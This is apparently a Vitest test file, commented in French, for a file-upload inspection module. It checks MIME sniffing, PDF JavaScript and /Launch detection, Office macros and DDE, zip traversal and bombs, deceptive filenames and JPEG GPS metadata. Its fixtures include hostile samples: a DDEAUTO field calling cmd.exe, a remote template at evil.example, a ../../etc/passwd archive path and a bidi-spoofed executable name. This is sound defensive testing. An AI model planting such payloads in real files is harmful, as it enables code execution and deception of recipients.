// Dupliqué de socle/convex/modules/fileGuard/inspect.test.ts @ ad2e7fdc2 — adaptations : copie textuelle ; ajout SD-02 : un JPEG dont le segment APP1 porte un bloc GPS est SIGNALÉ (`IMAGE_GPS_METADATA`, sévérité `info`) sans que le verdict change.
import { describe, expect, it } from "vitest"
import JSZip from "jszip"
import {
  decodePdfNameEscapes,
  indexOfBytes,
  inspectFilename,
  inspectJpegMetadata,
  inspectOle2,
  inspectPdf,
  inspectZipEntries,
  mimeFamily,
  mimeMismatchFinding,
  normalizeMime,
  runDeterministicInspection,
  sniffMime,
  type ZipEntryInfo,
} from "./inspect"
import { decideVerdict } from "./verdict"

const enc = new TextEncoder()
const bytes = (text: string) => enc.encode(text)
const PNG_HEADER = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13])
const PDF_MINIMAL = "%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n"

async function zipEntriesOf(files: Record<string, string | Uint8Array>): Promise<ZipEntryInfo[]> {
  const zip = new JSZip()
  for (const [path, content] of Object.entries(files)) zip.file(path, content)
  const archive = await JSZip.loadAsync(await zip.generateAsync({ type: "uint8array" }))
  const out: ZipEntryInfo[] = []
  archive.forEach((path, file) => {
    if (file.dir) return
    const data = (file as unknown as { _data?: { compressedSize?: number; uncompressedSize?: number } })._data
    out.push({
      path,
      compressedSize: data?.compressedSize ?? null,
      uncompressedSize: data?.uncompressedSize ?? null,
      readText: () => file.async("string"),
    })
  })
  return out
}

describe("fileGuard/inspect — type réel (magic bytes)", () => {
  it("reconnaît les signatures usuelles", () => {
    expect(sniffMime(bytes(PDF_MINIMAL))).toBe("application/pdf")
    expect(sniffMime(PNG_HEADER)).toBe("image/png")
    expect(sniffMime(new Uint8Array([0xff, 0xd8, 0xff, 0xe0]))).toBe("image/jpeg")
    expect(sniffMime(bytes("GIF89a"))).toBe("image/gif")
    expect(sniffMime(new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0, 0]))).toBe("application/zip")
    expect(sniffMime(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]))).toBe("application/x-ole-storage")
    expect(sniffMime(bytes("RIFF\0\0\0\0WEBPVP8 "))).toBe("image/webp")
    expect(sniffMime(bytes("RIFF\0\0\0\0WAVEfmt "))).toBe("audio/wav")
    expect(sniffMime(bytes("\0\0\0\x18ftypheic\0\0\0\0"))).toBe("image/heic")
    expect(sniffMime(bytes("\0\0\0\x18ftypmp42\0\0\0\0"))).toBe("video/mp4")
    expect(sniffMime(new Uint8Array([0x1a, 0x45, 0xdf, 0xa3, 0]))).toBe("video/webm")
    expect(sniffMime(bytes("OggS\0\0"))).toBe("audio/ogg")
    expect(sniffMime(bytes("ID3\x04\0"))).toBe("audio/mpeg")
    expect(sniffMime(bytes("MZ\x90\0\x03"))).toBe("application/x-msdownload")
    expect(sniffMime(new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2]))).toBe("application/x-elf")
    expect(sniffMime(bytes("#!/bin/sh\necho"))).toBe("text/x-script")
    expect(sniffMime(bytes("<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"/>"))).toBe("image/svg+xml")
    expect(sniffMime(bytes("<!DOCTYPE html><html><body>x</body></html>"))).toBe("text/html")
    expect(sniffMime(bytes("Bonjour, ceci est un texte."))).toBe("text/plain")
    expect(sniffMime(new Uint8Array([0x00, 0x01, 0x02, 0x03, 0xfe]))).toBeNull()
    expect(sniffMime(new Uint8Array([]))).toBeNull()
  })

  it("tolère jusqu'à 1 024 octets avant l'en-tête PDF", () => {
    expect(sniffMime(bytes(" ".repeat(500) + PDF_MINIMAL))).toBe("application/pdf")
    expect(sniffMime(bytes(" ".repeat(2000) + PDF_MINIMAL))).toBe("text/plain")
  })

  it("normalise les types et les range par famille", () => {
    expect(normalizeMime("Audio/WebM; codecs=opus")).toBe("audio/webm")
    expect(normalizeMime("image/jpg")).toBe("image/jpeg")
    expect(normalizeMime("")).toBeNull()
    expect(mimeFamily("application/vnd.openxmlformats-officedocument.wordprocessingml.document")).toBe("zip")
    expect(mimeFamily("application/msword")).toBe("ole2")
    expect(mimeFamily("audio/webm")).toBe("webm")
    expect(mimeFamily("video/webm")).toBe("webm")
    expect(mimeFamily("application/x-msdownload")).toBe("executable")
    expect(mimeFamily("text/markdown")).toBe("text")
    expect(mimeFamily("application/x-quelconque")).toBe("unknown")
  })

  it("déclaré ↔ détecté : un PNG annoncé PDF est suspect, un exécutable est critique", () => {
    expect(mimeMismatchFinding("application/pdf", "image/png")).toMatchObject({
      code: "MIME_MISMATCH",
      severity: "warning",
    })
    expect(mimeMismatchFinding("image/png", "application/x-msdownload")).toMatchObject({
      code: "EXECUTABLE_CONTENT",
      severity: "critical",
    })
    expect(mimeMismatchFinding("application/pdf", "text/html")).toMatchObject({
      code: "ACTIVE_CONTENT",
      severity: "critical",
    })
    expect(mimeMismatchFinding("application/pdf", "application/pdf")).toBeNull()
    expect(mimeMismatchFinding("image/jpg", "image/jpeg")).toBeNull()
    expect(mimeMismatchFinding("audio/webm;codecs=opus", "video/webm")).toBeNull()
    expect(mimeMismatchFinding("application/pdf", null)).toMatchObject({ code: "MIME_UNRECOGNIZED" })
    // Un MP3 sans en-tête reconnaissable n'est qu'un signal informatif.
    expect(mimeMismatchFinding("audio/mpeg", null)).toBeNull()
    expect(mimeMismatchFinding(undefined, "image/png")).toBeNull()
  })
})

describe("fileGuard/inspect — contenu actif d'un PDF", () => {
  it("un PDF sain ne lève rien de plus qu'informatif", () => {
    const findings = inspectPdf(bytes(PDF_MINIMAL))
    expect(findings.filter((f) => f.severity !== "info")).toEqual([])
  })

  it("JavaScript à l'ouverture est critique ; JavaScript seul est un avertissement", () => {
    const auto = inspectPdf(
      bytes(PDF_MINIMAL.replace("/Type /Catalog", "/Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >>"))
    )
    expect(auto.map((f) => f.code)).toContain("PDF_AUTO_JAVASCRIPT")
    const alone = inspectPdf(bytes(PDF_MINIMAL + "\n3 0 obj << /S /JavaScript /JS (x) >> endobj\n"))
    expect(alone.find((f) => f.code === "PDF_JAVASCRIPT")?.severity).toBe("warning")
    expect(alone.map((f) => f.code)).not.toContain("PDF_AUTO_JAVASCRIPT")
  })

  it("lit les noms hex-échappés (/J#61vaScript vaut /JavaScript)", () => {
    expect(decodePdfNameEscapes("/J#61vaScript")).toBe("/JavaScript")
    const hidden = inspectPdf(bytes(PDF_MINIMAL + "\n3 0 obj << /S /J#61vaScript /JS (x) /OpenAction 1 >> endobj\n"))
    expect(hidden.map((f) => f.code)).toContain("PDF_AUTO_JAVASCRIPT")
  })

  it("/Launch est critique, un fichier embarqué et un formulaire sortant sont des avertissements", () => {
    const codes = inspectPdf(
      bytes(PDF_MINIMAL + "\n3 0 obj << /S /Launch /F (cmd.exe) >> endobj\n4 0 obj << /Type /EmbeddedFile >> endobj\n5 0 obj << /S /SubmitForm >> endobj\n")
    ).map((f) => `${f.code}:${f.severity}`)
    expect(codes).toContain("PDF_LAUNCH_ACTION:critical")
    expect(codes).toContain("PDF_EMBEDDED_FILE:warning")
    expect(codes).toContain("PDF_FORM_EXFILTRATION:warning")
  })

  it("un PDF chiffré ou tronqué n'est qu'un signal informatif", () => {
    const codes = inspectPdf(bytes("%PDF-1.7\n1 0 obj << /Encrypt 2 0 R >> endobj\n")).map((f) => `${f.code}:${f.severity}`)
    expect(codes).toContain("PDF_ENCRYPTED:info")
    expect(codes).toContain("PDF_NO_EOF:info")
  })
})

describe("fileGuard/inspect — documents Office et archives", () => {
  it("un docx avec vbaProject.bin est critique (macros)", async () => {
    const entries = await zipEntriesOf({
      "[Content_Types].xml": "<Types><Override PartName=\"/word/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/></Types>",
      "word/document.xml": "<w:document/>",
      "word/vbaProject.bin": new Uint8Array([1, 2, 3]),
    })
    const findings = await inspectZipEntries(entries, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
    expect(findings.some((f) => f.code === "OOXML_MACROS" && f.severity === "critical")).toBe(true)
  })

  it("un docx sain ne lève rien", async () => {
    const entries = await zipEntriesOf({
      "[Content_Types].xml": "<Types/>",
      "word/document.xml": "<w:document><w:body><w:p>Bonjour</w:p></w:body></w:document>",
      "word/_rels/document.xml.rels": '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://administration.ga" TargetMode="External"/></Relationships>',
    })
    expect(await inspectZipEntries(entries, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")).toEqual([])
  })

  it("une relation externe non-hyperlien (modèle distant) et un champ DDE sont détectés", async () => {
    const entries = await zipEntriesOf({
      "[Content_Types].xml": "<Types/>",
      "word/document.xml": '<w:document><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe</w:instrText></w:document>',
      "word/_rels/settings.xml.rels": '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>',
    })
    const codes = (await inspectZipEntries(entries, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")).map((f) => `${f.code}:${f.severity}`)
    expect(codes).toContain("OOXML_DDE:critical")
    expect(codes).toContain("OOXML_EXTERNAL_RELATIONSHIP:warning")
  })

  it("un xlsx déclaré docx est signalé, un objet OLE embarqué aussi", async () => {
    const entries = await zipEntriesOf({
      "[Content_Types].xml": "<Types/>",
      "xl/workbook.xml": "<workbook/>",
      "xl/embeddings/oleObject1.bin": new Uint8Array([0]),
    })
    const codes = (await inspectZipEntries(entries, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")).map((f) => f.code)
    expect(codes).toContain("OOXML_KIND_MISMATCH")
    expect(codes).toContain("OOXML_EMBEDDED_OBJECT")
  })

  it("traversée de chemin et exécutable embarqué sont critiques, une bombe aussi", async () => {
    const findings = await inspectZipEntries(
      [
        { path: "../../etc/passwd", compressedSize: 10, uncompressedSize: 10 },
        { path: "setup.exe", compressedSize: 10, uncompressedSize: 10 },
        { path: "big.bin", compressedSize: 1000, uncompressedSize: 200 * 1024 * 1024 },
        { path: "inner.zip", compressedSize: 10, uncompressedSize: 10 },
      ],
      "application/zip"
    )
    const codes = findings.map((f) => `${f.code}:${f.severity}`)
    expect(codes).toContain("ZIP_PATH_TRAVERSAL:critical")
    expect(codes).toContain("ZIP_EXECUTABLE_ENTRY:critical")
    expect(codes).toContain("ZIP_BOMB:critical")
    expect(codes).toContain("ZIP_NESTED_ARCHIVE:warning")
  })

  it("un conteneur OLE2 avec flux VBA est critique", () => {
    const marker = "_VBA_PROJECT"
    const utf16 = new Uint8Array(marker.length * 2)
    for (let i = 0; i < marker.length; i += 1) utf16[i * 2] = marker.charCodeAt(i)
    const file = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, ...new Array(64).fill(0), ...utf16])
    expect(inspectOle2(file).some((f) => f.code === "OLE_MACROS" && f.severity === "critical")).toBe(true)
    expect(inspectOle2(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0, 0, 0, 0]))).toEqual([])
  })
})

describe("fileGuard/inspect — nom de fichier", () => {
  it("double extension, extension exécutable et renversement bidi sont critiques", () => {
    expect(inspectFilename("facture.pdf.exe").map((f) => f.code)).toContain("FILENAME_DOUBLE_EXTENSION")
    expect(inspectFilename("script.ps1").map((f) => f.code)).toContain("FILENAME_EXECUTABLE_EXTENSION")
    expect(inspectFilename("rapport\u202Efdp.exe").map((f) => f.code)).toContain("FILENAME_BIDI_OVERRIDE")
    expect(inspectFilename("Rapport annuel 2026.pdf")).toEqual([])
    expect(inspectFilename(null)).toEqual([])
  })
})

describe("fileGuard/inspect — orchestration", () => {
  it("un PDF sain correctement déclaré passe sans avertissement", async () => {
    const report = await runDeterministicInspection({
      bytes: bytes(PDF_MINIMAL),
      declaredMimeType: "application/pdf",
      filename: "note.pdf",
    })
    expect(report.detectedMimeType).toBe("application/pdf")
    expect(report.findings.filter((f) => f.severity !== "info")).toEqual([])
  })

  it("un PNG déclaré PDF est suspect ; un exécutable déclaré image est critique", async () => {
    const png = await runDeterministicInspection({ bytes: PNG_HEADER, declaredMimeType: "application/pdf", filename: "x.pdf" })
    expect(png.findings.map((f) => f.code)).toContain("MIME_MISMATCH")
    const exe = await runDeterministicInspection({ bytes: bytes("MZ\x90\0"), declaredMimeType: "image/png", filename: "photo.png" })
    expect(exe.findings.some((f) => f.severity === "critical")).toBe(true)
  })

  it("une archive illisible est un avertissement, un fichier vide aussi", async () => {
    const zip = await runDeterministicInspection({ bytes: new Uint8Array([0x50, 0x4b, 0x03, 0x04, 1, 2]), declaredMimeType: "application/zip", zipEntries: null })
    expect(zip.findings.map((f) => f.code)).toContain("ZIP_UNREADABLE")
    const empty = await runDeterministicInspection({ bytes: new Uint8Array([]), declaredMimeType: "application/pdf" })
    expect(empty.findings.map((f) => f.code)).toEqual(["EMPTY_FILE"])
  })

  it("indexOfBytes trouve un motif et respecte sa borne", () => {
    const hay = bytes("abc%PDF-xyz")
    expect(indexOfBytes(hay, [0x25, 0x50, 0x44, 0x46])).toBe(3)
    expect(indexOfBytes(hay, [0x25, 0x50, 0x44, 0x46], 4)).toBe(-1)
    expect(indexOfBytes(hay, [0x7a, 0x7a])).toBe(-1)
  })
})

describe("fileGuard/inspect — position GPS d'une photo (SD-02, mode « signaler »)", () => {
  /** Un JPEG 2×2 réel (libjpeg-turbo), sans métadonnée. */
  const JPEG_2X2 = Uint8Array.from(
    Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAACAAIDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAj/xAAdEAACAgMAAwAAAAAAAAAAAAABAgADBAUGBxIh/8QAFQEBAQAAAAAAAAAAAAAAAAAABQf/xAAZEQACAwEAAAAAAAAAAAAAAAAAAgEDMnH/2gAMAwEAAhEDEQA/AKb5zx/y+Rz2rtt5vUWWvi1M7vg1FmJQEkn1+mIiTOvC8BX1J//Z",
      "base64"
    )
  )

  /**
   * Le même JPEG avec un APP1 EXIF (gros-boutiste) : IFD0 → pointeur GPS
   * (`0x8825`) → IFD GPS d'une entrée (référence de latitude, valeur FICTIVE).
   */
  function jpegWithGps(): Uint8Array {
    const tiff = [
      0x4d, 0x4d, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x08,
      0x00, 0x01, 0x88, 0x25, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x01, 0x00, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x4e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ]
    const payload = [0x45, 0x78, 0x69, 0x66, 0x00, 0x00, ...tiff]
    const app1 = [0xff, 0xe1, (payload.length + 2) >> 8, (payload.length + 2) & 0xff, ...payload]
    return Uint8Array.from([...JPEG_2X2.subarray(0, 20), ...app1, ...JPEG_2X2.subarray(20)])
  }

  it("signale un JPEG qui porte un bloc GPS, sans signal pour le même JPEG nu", () => {
    expect(inspectJpegMetadata(jpegWithGps())).toEqual([
      { code: "IMAGE_GPS_METADATA", severity: "info", detail: "position GPS dans le segment APP1 (EXIF ou XMP)" },
    ])
    expect(inspectJpegMetadata(JPEG_2X2)).toEqual([])
  })

  it("l'analyse complète lève le signal, et le verdict reste sain : signaler, pas refuser", async () => {
    const report = await runDeterministicInspection({ bytes: jpegWithGps(), declaredMimeType: "image/jpeg", filename: "photo.jpg" })
    expect(report.detectedMimeType).toBe("image/jpeg")
    expect(report.findings).toEqual([
      { code: "IMAGE_GPS_METADATA", severity: "info", detail: "position GPS dans le segment APP1 (EXIF ou XMP)" },
    ])
    expect(decideVerdict({ findings: report.findings, av: { provider: "test", verdict: "clean" } })).toEqual({ status: "clean", reason: "OK" })
    const clean = await runDeterministicInspection({ bytes: JPEG_2X2, declaredMimeType: "image/jpeg", filename: "photo.jpg" })
    expect(clean.findings).toEqual([])
  })

  it("ne lit le GPS que dans un JPEG : un PNG n'est pas concerné", async () => {
    const png = await runDeterministicInspection({ bytes: PNG_HEADER, declaredMimeType: "image/png", filename: "x.png" })
    expect(png.findings.map((f) => f.code)).not.toContain("IMAGE_GPS_METADATA")
  })
})
